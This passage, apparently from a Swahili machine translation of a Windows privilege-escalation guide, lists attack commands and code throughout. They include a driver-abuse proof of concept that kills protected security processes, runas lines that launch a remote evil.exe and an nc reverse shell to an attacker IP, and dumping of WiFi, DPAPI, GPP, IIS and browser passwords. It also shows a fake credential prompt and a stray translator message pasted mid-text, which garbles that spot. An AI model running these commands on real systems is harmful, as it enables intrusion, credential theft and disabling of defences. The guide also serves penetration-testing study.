accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Endesha wakati wa kuanza

**Angalia ikiwa unaweza kuandika upya baadhi ya registry au binary ambazo zitatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa ufuatao ili ujifunze zaidi kuhusu maeneo ya autoruns yanayovutia kwa ajili ya escalate privileges:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Angalia uwezekano wa madereva ya **wa mtu wa tatu zisizo za kawaida/zilizo hatarini**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya drivers za third‑party zilizosainiwa huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila flag hii, secure DACL haisiitishwa wakati device inafunguliwa kupitia path yenye component ya ziada, ikiwaruhusu mtumiaji asiye na ruhusa kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kesi ya maisha halisi)

Mara mtumiaji aweze kufungua device, privileged IOCTLs exposed by the driver zinaweza kutumika kwa LPE na tampering. Mifano ya uwezo ulioonekana kwenye mazingira halisi:
- Kurudisha handles za full-access kwa mchakato wowote (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Mfano mdogo wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mikakati ya kupunguza hatari kwa watengenezaji
- Daima weka FILE_DEVICE_SECURE_OPEN wakati wa kuunda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha caller context kwa privileged operations. Ongeza PP/PPL checks kabla ya kuruhusu process termination au handle returns.
- Zuia IOCTLs (access masks, METHOD_*, input validation) na zingatia brokered models badala ya direct kernel privileges.

Mawazo za utambuzi kwa walinzi
- Fuatilia user-mode opens za majina ya device yanayoshukiwa (e.g., \\ .\\amsdk*) na mfululizo maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza blocklist ya madereva dhaifu ya Microsoft (HVCI/WDAC/Smart App Control) na udumishe orodha zako za kuruhusu/kuzuia.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Kagua ruhusa za folda zote zilizopo kwenye PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Rasilimali zilizoshirikiwa
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zilizojulikana zilizowekwa hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Violesura vya Mtandao na DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizo wazi

Angalia **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Upitishaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Sheria za Firewall

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Zaidi[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Bainari `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata root user unaweza kusikiliza kwenye bandari yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye bandari, itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika saraka `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Vyeti vya Windows

### Vyeti za Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Msimamizi wa taarifa za kuingia / Windows Vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault huhifadhi nywila/cheti za watumiaji kwa server, tovuti na programu nyingine ambazo **Windows** inaweza **kuingia watumiaji kiotomatiki**. Awali, inaweza kuonekana kwamba watumiaji wanaweza kuhifadhi nywila zao za Facebook, Twitter, Gmail n.k., ili waingie kiotomatiki kupitia vivinjari. Lakini si hivyo.

Windows Vault huhifadhi nywila ambazo Windows inaweza kuingia kwa watumiaji kiotomatiki, ambayo ina maana kwamba programu yoyote ya **Windows ambayo inahitaji nywila ili kufikia rasilimali** (server au tovuti) **inaweza kutumia Credential Manager** & Windows Vault na kutumia nywila zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila wakati.

Isipokuwa programu zinashirikiana na Credential Manager, sidhani inawezekana kwao kutumia nywila za rasilimali fulani. Hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na Credential Manager na kuomba nywila za rasilimali hiyo** kutoka kwa default storage vault.

Tumia `cmdkey` kuorodhesha nywila zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia taarifa za kuingia zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya kredensiali iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwa [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** hutoa njia ya usimbaji fiche wa simetriki wa data, inayotumika hasa ndani ya mfumo wa uendeshaji Windows kwa usimbaji fiche wa simetriki wa funguo binafsi zisizo-simetriki. Usimbaji huu unatumia siri ya mtumiaji au ya mfumo ambayo huchangia kwa kiasi kikubwa kwenye entropy.

**DPAPI inawezesha usimbaji wa funguo kupitia ufunguo wa simetriki unaotokana na siri za kuingia za mtumiaji**. Katika matukio yanayohusisha usimbaji wa mfumo, inatumia siri za uthibitisho za domain ya mfumo.

Funguo za RSA za watumiaji zilizofichwa kwa kutumia DPAPI zinahifadhiwa katika `%APPDATA%\Microsoft\Protect\{SID}` directory, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Ufunguo wa DPAPI, ulioko pamoja na ufunguo mkuu unaolinda funguo binafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida una takriban 64 bytes za data za nasibu. (Ni muhimu kutambua kwamba ufikaji wa saraka hii ni mdhibitiwa, ukizuia kuorodhesha yaliyomo kupitia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na hoja zinazofaa (`/pvk` au `/rpc`) ili kui-decrypt.

Faili za **credentials files protected by the master password** kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` na `/masterkey` inayofaa ili ku-decrypt.\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

PowerShell credentials mara nyingi hutumika kwa scripting na automation tasks kama njia rahisi ya kuhifadhi encrypted credentials. Credentials hizi zinalindwa kwa kutumia DPAPI, ambayo kwa kawaida inamaanisha zinaweza ku-decrypt tu na mtumiaji yule yule kwenye kompyuta ileile walizotengenezwa.

Ili **ku-decrypt** PS credentials kutoka kwenye faili linaloiweka unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri zilizotumika hivi karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Vyeti za Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module pamoja na `/masterkey` inayofaa ili **ku-decrypt** faili yoyote ya `.rdg`\
Unaweza **extract** DPAPI masterkeys nyingi kutoka memory kwa kutumia Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia StickyNotes app kwenye workstations za Windows ili **save passwords** na taarifa nyingine, bila kutambua kuwa ni database file. Faili hii iko kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

Kumbuka kwamba ili kurecover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha chini ya High Integrity level.\
AppCmd.exe iko kwenye `%systemroot%\system32\inetsrv\` directory.\
Kama faili hii ipo basi inawezekana kwamba baadhi ya **credentials** zimetayarishwa na zinaweza ku**recovered**.

Msimbo huu ulichukuliwa kutoka kwa [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` inapatikana .\
Installers zinaendeshwa kwa **SYSTEM privileges**, nyingi zinaweza kuwa hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Mafaili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ikiwa utapata kipengee chochote ndani ya njia hiyo, kuna uwezekano ni SSH key iliyohifadhiwa. Imehifadhiwa kwa usimbaji (encrypted) lakini inaweza kufichuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haijaendesha na unataka ianze kiotomatiki wakati wa boot, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda ssh keys, kuziweka kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikuonyesha matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizo sawa.

### Faili bila usimamizi
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa yaliyomo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Vyeti vya Wingu
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Nywila ya GPP Iliyohifadhiwa

Kipengele kilikuwa kipo kabla kilichoruhusu utoaji wa akaunti maalum za local administrator kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na mapungufu makubwa ya usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML katika SYSVOL, zinaweza kufikiwa na mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia default key iliyodokumentiwa hadharani, zinaweza kufichuliwa na mtumiaji yeyote aliyethibitishwa. Hii ilisababisha hatari kubwa, kwani inaweza kumruhusu mtumiaji kupata hadhi za juu.

Ili kupunguza hatari hii, ilitengenezwa function inayotafuta faili za GPP zilizohifadhiwa k lokal ambazo zina uwanja wa "cpassword" usiokuwa tupu. Iwapo faili kama hiyo itapatikana, function itadekrypta nywila na kurudisha PowerShell object maalum. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, ikisaidia katika utambuzi na utatuzi wa udhaifu huu wa usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata nywila:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Usanidi wa Wavuti
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config na credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN taarifa za kuingia
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Marekodi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ombi la credentials

Unaweza kila wakati **kumuuliza mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kuuliza** mteja moja kwa moja kwa **credentials** ni kweli **hatari**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana ambazo muda fulani uliopita zilikuwa na **passwords** katika **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Nahitaji maudhui ya faili src/windows-hardening/windows-local-privilege-escalation/README.md ili niweze kuyatafsiri kwa Kiswahili. Tafadhali bandika yaliyomo ya faili hiyo (au faili zote unazotaka nisitumie) au nimarishe jinsi nitakavyopata maudhui hayo.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Vyeti katika RecycleBin

Pia unapaswa kuangalia Bin kutafuta vyeti ndani yake

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya rejista

**Vitufe vingine vya rejista vinavyoweza kuwa na vyeti**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia za Vivinjari

Unapaswa kuangalia dbs ambapo nywila za **Chrome au Firefox** zinahifadhiwa.\
Pia angalia historia, alama na vipendwa vya vivinjari kwa sababu labda baadhi ya **nywila zimehifadhiwa** hapo.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

